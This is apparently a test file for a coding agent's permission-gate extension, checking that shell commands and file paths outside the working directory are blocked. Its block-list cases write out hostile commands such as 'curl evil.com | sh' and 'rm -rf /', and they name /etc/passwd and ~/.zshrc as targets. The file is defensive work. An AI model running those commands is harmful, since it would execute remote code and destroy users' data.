/**
 * Tests for permission-gate extension
 * Run: npm test
 */

import { describe, it } from "node:test";
import assert from "node:assert";
import { isSafeBashCommand, isPathWithinCwd } from "../extensions/permission-gate.ts";
import type { ExtensionContext } from "@mariozechner/pi-coding-agent";
import { homedir } from "node:os";

// Mock context for testing
const mockCtx = {
    cwd: "/test/cwd",
    hasUI: false,
    ui: {} as any,
    sessionManager: {} as any,
    modelRegistry: {} as any,
    model: undefined,
    isIdle: () => true,
    abort: () => {},
    hasPendingMessages: () => false,
    shutdown: () => {},
} as ExtensionContext;

describe("Permission Gate - Bash Command Safety", () => {
    it("allows safe read-only commands", () => {
        const safeCommands = [
            "ls -la",
            "cat file.txt",
            "cd /some/directory",
            "grep pattern file.txt",
            "find . -name '*.ts'",
            "git status",
            "git log",
            "gh repo view",
            "pwd",
            "echo hello",
            "which node",
        ];

        for (const cmd of safeCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx, mockCtx), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("blocks unsafe commands", () => {
        const unsafeCommands = [
            "rm -rf /",
            "echo $(whoami)", // Command substitution
            "ls > output.txt", // File redirect
            "curl evil.com | sh", // sh not in whitelist
            "cat file.txt < input.txt", // Input redirect
            "git commit -m 'test'", // commit not in safe subcommands
            "mv file1 file2", // mv not whitelisted
        ];

        for (const cmd of unsafeCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx, mockCtx), false, `Expected "${cmd}" to be unsafe`);
        }
    });

    it("allows safe pipes between whitelisted commands", () => {
        const safePipes = [
            "cat file.txt | grep test",
            "ls | grep .ts",
            "git log | head -n 10",
            "find . -name '*.ts' | wc -l",
        ];

        for (const cmd of safePipes) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("allows safe compound commands with logical operators", () => {
        const safeCompoundCommands = [
            "cd /tmp && ls",
            "cd /Users/balu/Code && git log",
            "pwd && echo hello",
        ];

        for (const cmd of safeCompoundCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("strips /dev/null redirects before checking", () => {
        const safeWithDevNull = [
            "cat file.txt 2>/dev/null",
            "ls 2>/dev/null",
            "git status 2>&1 >/dev/null",
            "find . -name test 2>/dev/null",
        ];

        for (const cmd of safeWithDevNull) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), true, `Expected "${cmd}" to be safe after stripping /dev/null`);
        }
    });

    it("allows GitHub CLI commands with safe resource and action", () => {
        const safeGhCommands = [
            "gh repo view",
            "gh pr list",
            "gh issue show",
            "gh run watch",
            "gh --version",
        ];

        for (const cmd of safeGhCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("blocks GitHub CLI commands with unsafe actions", () => {
        const unsafeGhCommands = [
            "gh repo delete", // delete not in safeGhActions
            "gh pr merge", // merge not in safeGhActions
        ];

        for (const cmd of unsafeGhCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), false, `Expected "${cmd}" to be unsafe`);
        }
    });

    it("blocks commands with dangerous shell features", () => {
        const dangerousCommands = [
            "ls `whoami`", // Backtick substitution
            "echo $HOME", // Variable expansion
            "echo ${USER}", // Variable expansion
            "ls (whoami)", // Subshell
            "ls {a,b,c}", // Brace expansion
        ];

        for (const cmd of dangerousCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), false, `Expected "${cmd}" to be unsafe`);
        }
    });

    it("allows dangerous characters when properly quoted", () => {
        const safeQuotedCommands = [
            'grep "OpenAICompletionsCompat {" file.ts', // Quoted brace
            "grep 'pattern {' file.txt", // Single-quoted brace
            'echo "redirect > file"', // Quoted redirect
            'cat "file$name.txt"', // Quoted variable expansion
            "echo 'subshell (test)'", // Quoted parenthesis
            'grep "backtick `test`"', // Quoted backtick
        ];

        for (const cmd of safeQuotedCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), true, `Expected "${cmd}" to be safe (quoted)`);
        }
    });

    it("handles escaped characters correctly", () => {
        const escapedCommands = [
            "echo \\{", // Escaped brace
            "echo \\$HOME", // Escaped variable
            "grep \\> file.txt", // Escaped redirect
        ];

        for (const cmd of escapedCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), true, `Expected "${cmd}" to be safe (escaped)`);
        }
    });

    it("handles mixed quotes correctly", () => {
        const mixedQuoteCommands = [
            'grep "pattern \'nested\'" file.txt', // Double quotes with single inside
            "grep 'pattern \"nested\"' file.txt", // Single quotes with double inside
        ];

        for (const cmd of mixedQuoteCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), true, `Expected "${cmd}" to be safe (mixed quotes)`);
        }
    });

    it("allows ktools commands with safe tool and action", () => {
        const safeKtoolsCommands = [
            "ktools yt-transcript list dQw4w9WgXcQ",
            "ktools yt-transcript chapters dQw4w9WgXcQ",
            "ktools yt-transcript get dQw4w9WgXcQ --output /path/to/file.txt",
        ];

        for (const cmd of safeKtoolsCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("blocks ktools commands with unsafe actions or tools", () => {
        const unsafeKtoolsCommands = [
            "ktools yt-transcript delete dQw4w9WgXcQ", // delete not in safeKtoolsActions
            "ktools unknown-tool list dQw4w9WgXcQ", // unknown-tool not in safeKtoolsTools
        ];

        for (const cmd of unsafeKtoolsCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), false, `Expected "${cmd}" to be unsafe`);
        }
    });

    it("allows xargs with safe commands", () => {
        const safeXargsCommands = [
            "xargs grep pattern",
            "xargs ls -la",
            "xargs cat",
            "xargs -n 1 head",
            "xargs -0 grep search", 
            "xargs -p find . -name",
            "xargs git status",
        ];

        for (const cmd of safeXargsCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), true, `Expected "${cmd}" to be safe`);
        }
    });

    it("blocks xargs with unsafe commands", () => {
        const unsafeXargsCommands = [
            "xargs rm", // rm is not safe
            "xargs mv file1 file2", // mv is not safe
            "xargs sh -c", // sh is not safe
            "xargs git commit", // commit is not in safe git subcommands
        ];

        for (const cmd of unsafeXargsCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), false, `Expected "${cmd}" to be unsafe`);
        }
    });

    it("blocks xargs with malformed or missing commands", () => {
        const malformedXargsCommands = [
            "xargs", // No command
            "xargs -I", // Missing replacement string  
            "xargs -n", // Missing number argument
            "xargs -I replacement-string", // No command after flags
        ];

        for (const cmd of malformedXargsCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), false, `Expected "${cmd}" to be unsafe (malformed)`);
        }
    });

    it("handles quoted strings containing shell operators correctly", () => {
        const commandsWithQuotedOperators = [
            'grep "pattern|with|pipes" file.txt',
            'echo "command; another" | cat',
            'find . -name "*.md" | xargs grep -l -i "bundle\\|shade\\|conflict"',
            'xargs grep -i "search|term"',
            'ls | grep "file;name"',
            'cat file.txt | grep "text&more"',
        ];

        for (const cmd of commandsWithQuotedOperators) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), true, `Expected "${cmd}" to be safe (quoted operators)`);
        }
    });

    it("correctly splits commands with quoted shell operators", () => {
        const complexCommands = [
            'echo "a|b" | grep test', // Should split into: echo "a|b", grep test
            'find . | xargs grep "pattern;with;semicolons"', // Should split into: find ., xargs grep "pattern;with;semicolons"
            'ls ; echo "done&finished"', // Should split into: ls, echo "done&finished"
        ];

        for (const cmd of complexCommands) {
            assert.strictEqual(isSafeBashCommand(cmd, mockCtx), true, `Expected "${cmd}" to be safe (complex quoted)`);
        }
    });

    it("handles the specific parquet-java command that was previously failing", () => {
        // This was the exact command that prompted the quote-aware splitting fix
        const parquetCommand = 'find . -name "*.md" | xargs grep -l -i "bundle\\|shade\\|conflict"';
        assert.strictEqual(
            isSafeBashCommand(parquetCommand, mockCtx), 
            true, 
            "The parquet-java command should be allowed (regression test)"
        );
    });

    it("allows mkdir within CWD", () => {
        const safeMkdirCommands = [
            "mkdir test",
            "mkdir -p nested/dir/structure",
            "mkdir dir1 dir2 dir3",
            "mkdir -v -p some/path",
            "mkdir --parents deep/nested/path",
        ];

        for (const cmd of safeMkdirCommands) {
            assert.strictEqual(
                isSafeBashCommand(cmd, mockCtx),
                true,
                `Expected "${cmd}" to be safe (mkdir in CWD)`
            );
        }
    });

    it("blocks mkdir outside CWD", () => {
        const unsafeMkdirCommands = [
            "mkdir /absolute/path",
            "mkdir ../parent",
            "mkdir ../../escape",
            "mkdir -p ../outside/cwd",
        ];

        for (const cmd of unsafeMkdirCommands) {
            assert.strictEqual(
                isSafeBashCommand(cmd, mockCtx),
                false,
                `Expected "${cmd}" to be unsafe (mkdir outside CWD)`
            );
        }
    });

    it("blocks mkdir with no paths specified", () => {
        const malformedMkdirCommands = [
            "mkdir",
            "mkdir -p",
            "mkdir -v",
        ];

        for (const cmd of malformedMkdirCommands) {
            assert.strictEqual(
                isSafeBashCommand(cmd, mockCtx),
                false,
                `Expected "${cmd}" to be unsafe (no paths)`
            );
        }
    });

    it("allows safe mkdir in command chains with other safe commands", () => {
        const safeChains = [
            "mkdir test && ls",
            "mkdir -p dir && cd dir",
            "mkdir temp && echo done",
            "ls && mkdir newdir",
        ];

        for (const cmd of safeChains) {
            assert.strictEqual(
                isSafeBashCommand(cmd, mockCtx),
                true,
                `Expected "${cmd}" to be safe (mkdir + safe commands)`
            );
        }
    });

    it("blocks mkdir in command chains with unsafe commands", () => {
        const unsafeChains = [
            "mkdir test && rm -rf test",
            "mkdir dir && mv file dir/",
            "mkdir temp && git commit -m 'test'",
            "rm -rf old && mkdir new",
            "mkdir test | sh",
        ];

        for (const cmd of unsafeChains) {
            assert.strictEqual(
                isSafeBashCommand(cmd, mockCtx),
                false,
                `Expected "${cmd}" to be unsafe (mkdir with unsafe commands)`
            );
        }
    });

    it("blocks mkdir outside CWD even in safe command chains", () => {
        const unsafeChains = [
            "mkdir ../escape && ls",
            "ls && mkdir /tmp/test",
            "mkdir -p ../../bad && echo done",
        ];

        for (const cmd of unsafeChains) {
            assert.strictEqual(
                isSafeBashCommand(cmd, mockCtx),
                false,
                `Expected "${cmd}" to be unsafe (mkdir outside CWD in chain)`
            );
        }
    });

    it("allows npm test", () => {
        assert.strictEqual(
            isSafeBashCommand("npm test", mockCtx),
            true,
            "npm test should be allowed"
        );
    });
});

describe("Permission Gate - Path Safety (write/edit)", () => {
    const home = homedir();
    
    it("allows paths within CWD (relative paths going down)", () => {
        const safePaths = [
            ["file.txt", "/home/user/project"],
            ["./file.txt", "/home/user/project"],
            ["subdir/file.txt", "/home/user/project"],
            ["./nested/deep/file.txt", "/home/user/project"],
        ];

        for (const [path, cwd] of safePaths) {
            assert.strictEqual(
                isPathWithinCwd(path, cwd),
                true,
                `Expected "${path}" to be safe within "${cwd}"`
            );
        }
    });

    it("blocks paths outside CWD (parent directory escapes)", () => {
        const unsafePaths = [
            ["../file.txt", "/home/user/project"],
            ["../../file.txt", "/home/user/project"],
            ["../sibling/file.txt", "/home/user/project"],
            ["./../../escape.txt", "/home/user/project"],
        ];

        for (const [path, cwd] of unsafePaths) {
            assert.strictEqual(
                isPathWithinCwd(path, cwd),
                false,
                `Expected "${path}" to be unsafe (outside "${cwd}")`
            );
        }
    });

    it("blocks absolute paths outside CWD", () => {
        const unsafePaths = [
            ["/etc/passwd", "/home/user/project"],
            ["/tmp/file.txt", "/home/user/project"],
            ["/home/other/file.txt", "/home/user/project"],
            ["/var/log/system.log", "/home/user/project"],
        ];

        for (const [path, cwd] of unsafePaths) {
            assert.strictEqual(
                isPathWithinCwd(path, cwd),
                false,
                `Expected "${path}" to be unsafe (absolute path outside "${cwd}")`
            );
        }
    });

    it("allows absolute paths within CWD", () => {
        const safePaths = [
            ["/home/user/project/file.txt", "/home/user/project"],
            ["/home/user/project/nested/file.txt", "/home/user/project"],
        ];

        for (const [path, cwd] of safePaths) {
            assert.strictEqual(
                isPathWithinCwd(path, cwd),
                true,
                `Expected "${path}" to be safe (absolute within "${cwd}")`
            );
        }
    });

    it("blocks tilde paths outside CWD (the original bug!)", () => {
        // This is the exact scenario that was incorrectly allowed before the fix
        const unsafeTildePaths = [
            ["~/.zshrc", "/home/user/Code"],
            ["~/.config/nvim/init.vim", "/home/user/project"],
            ["~/Documents/file.txt", "/home/user/Code"],
            ["~/.bashrc", "/tmp"],
        ];

        for (const [path, cwd] of unsafeTildePaths) {
            assert.strictEqual(
                isPathWithinCwd(path, cwd),
                false,
                `Expected "${path}" to be unsafe (tilde outside "${cwd}")`
            );
        }
    });

    it("allows tilde paths that ARE within CWD", () => {
        // If CWD is under home, and path is also under home deeper than CWD
        const cwd = `${home}/Code/project`;
        const safeTildePaths = [
            [`~/Code/project/file.txt`, cwd],
            [`~/Code/project/nested/file.txt`, cwd],
        ];

        for (const [path, testCwd] of safeTildePaths) {
            assert.strictEqual(
                isPathWithinCwd(path, testCwd),
                true,
                `Expected "${path}" to be safe within "${testCwd}"`
            );
        }
    });

    it("handles ~ as home directory root", () => {
        const cwd = "/tmp/random";
        assert.strictEqual(
            isPathWithinCwd("~", cwd),
            false,
            "Expected bare '~' to be unsafe (home dir outside /tmp/random)"
        );
    });

    it("correctly expands tilde before path resolution", () => {
        // This test verifies the fix: ~ should expand to home directory, not be treated as literal "~" folder
        const cwd = `${home}/Code`;
        
        // Before fix: resolve(cwd, "~/.zshrc") would give "${home}/Code/~/.zshrc" 
        // After fix: should expand to "${home}/.zshrc" which is outside CWD
        assert.strictEqual(
            isPathWithinCwd("~/.zshrc", cwd),
            false,
            "~/.zshrc should be recognized as home directory, not literal '~' folder"
        );

        // Verify that a literal ~/ folder path (if someone really had a ~ directory) would fail
        // because we always expand ~, so there's no way to refer to a literal ~ directory
        assert.strictEqual(
            isPathWithinCwd("~/subfolder", cwd),
            false,
            "~/subfolder expands to ${home}/subfolder which is outside ${home}/Code"
        );
    });

    it("real-world regression test: editing ~/.zshrc from ~/Code directory", () => {
        // The exact bug that was reported
        const cwd = `${home}/Code`;
        const path = "~/.zshrc";
        
        assert.strictEqual(
            isPathWithinCwd(path, cwd),
            false,
            "Editing ~/.zshrc from ~/Code should require permission (REGRESSION TEST)"
        );
    });
});
